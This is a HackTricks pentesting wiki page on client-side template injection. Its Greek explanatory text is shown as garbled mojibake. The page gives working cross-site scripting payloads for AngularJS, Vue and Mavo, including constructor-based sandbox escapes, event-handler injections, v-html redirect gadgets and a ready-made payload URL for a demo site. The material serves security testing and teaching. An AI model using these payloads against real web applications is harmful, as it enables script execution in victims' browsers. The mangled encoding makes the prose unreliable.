# Client Side Template Injection (CSTI)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Summary

Î•Î¯Î½Î±Î¹ ÏŒÏ€Ï‰Ï‚ Î¼Î¹Î± [**Server Side Template Injection**](ssti-server-side-template-injection/) Î±Î»Î»Î¬ ÏƒÏ„Î·Î½ **Ï€ÎµÎ»Î¬Ï„Î·**. Î— **SSTI** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±** ÏƒÏ„Î¿Î½ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Î· **CSTI** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ JavaScript** ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚.

**Î”Î¿ÎºÎ¹Î¼Î®** Î³Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï **Ï€Î±ÏÏŒÎ¼Î¿Î¹Î±** Î¼Îµ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï„Î·Ï‚ **SSTI**, Î¿ Î´Î¹ÎµÏÎ¼Î·Î½Î­Î±Ï‚ Î±Î½Î±Î¼Î­Î½ÎµÎ¹ **Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿** ÎºÎ±Î¹ Î¸Î± Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Îµ Î­Î½Î± payload ÏŒÏ€Ï‰Ï‚ `{{ 7-7 }}`, Î±Î½ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î·** Î¸Î± Î´ÎµÎ¯Ï„Îµ Î­Î½Î± `0`, ÎºÎ±Î¹ Î±Î½ ÏŒÏ‡Î¹, Î¸Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ: `{{ 7-7 }}`

## AngularJS

Î¤Î¿ AngularJS ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏ…ÏÎ­Ï‰Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ JavaScript Ï€Î¿Ï… Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ Î¼Îµ Ï„Î¿ HTML Î¼Î­ÏƒÏ‰ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„Î¬ Ï‰Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚, Î¼Î¯Î± Î±Î¾Î¹Î¿ÏƒÎ·Î¼ÎµÎ¯Ï‰Ï„Î· ÎµÎ¯Î½Î±Î¹ Î· **`ng-app`**. Î‘Ï…Ï„Î® Î· Î¿Î´Î·Î³Î¯Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿ AngularJS Î½Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ HTML, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· JavaScript ÎµÎºÏ†ÏÎ¬ÏƒÎµÏ‰Î½ Î¼Î­ÏƒÎ± ÏƒÎµ Î´Î¹Ï€Î»Î­Ï‚ Î±Î³ÎºÏÎ»ÎµÏ‚.

Î£Îµ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏŒÏ€Î¿Ï… Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Î±Î¹ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬ ÏƒÏ„Î¿ ÏƒÏÎ¼Î± HTML Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎµÏ€Î¹ÏƒÎ·Î¼Î±Î½Î¸ÎµÎ¯ Î¼Îµ `ng-app`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï‚ JavaScript ÎºÏÎ´Î¹ÎºÎ±Ï‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î· ÏƒÏÎ½Ï„Î±Î¾Î· Ï„Î¿Ï… AngularJS Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿. Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ JavaScript ÎºÏÎ´Î¹ÎºÎ±Ï‚:
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î¿Î»Ï **Î²Î±ÏƒÎ¹ÎºÏŒ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±** Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ ÏƒÏ„Î¿ **AngularJS** ÏƒÏ„Î¿ [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) ÎºÎ±Î¹ ÏƒÏ„Î¿ [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

{% hint style="danger" %}
[**Î— Angular 1.6 Î±Ï†Î±Î¯ÏÎµÏƒÎµ Ï„Î¿ sandbox**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) Î¿Ï€ÏŒÏ„Îµ Î±Ï€ÏŒ Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ·, Î­Î½Î± payload ÏŒÏ€Ï‰Ï‚ `{{constructor.constructor('alert(1)')()}}` Î® `<input ng-focus=$event.view.alert('XSS')>` Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯.
{% endhint %}

## VueJS

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± **ÎµÏ…Î¬Î»Ï‰Ï„Î· Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Vue** ÏƒÏ„Î¿ [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ payload: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

ÎšÎ±Î¹ Î¿ **ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î·Î³Î®Ï‚** Ï„Î¿Ï… ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï… Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î¿Ï‚ ÎµÎ´Ï: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
ÎˆÎ½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ ÎºÎ±Î»ÏŒ Î¬ÏÎ¸ÏÎ¿ Î³Î¹Î± Ï„Î¿ CSTI ÏƒÏ„Î¿ VUE Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿ [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
Î Î¯ÏƒÏ„Ï‰ÏƒÎ·: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V2**
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**Î”ÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± VUE payloads ÏƒÏ„Î¿** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## Mavo

Payload:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± payloads ÏƒÏ„Î¿** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

## **Î›Î¯ÏƒÏ„Î± Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ Brute-Force**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}



{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
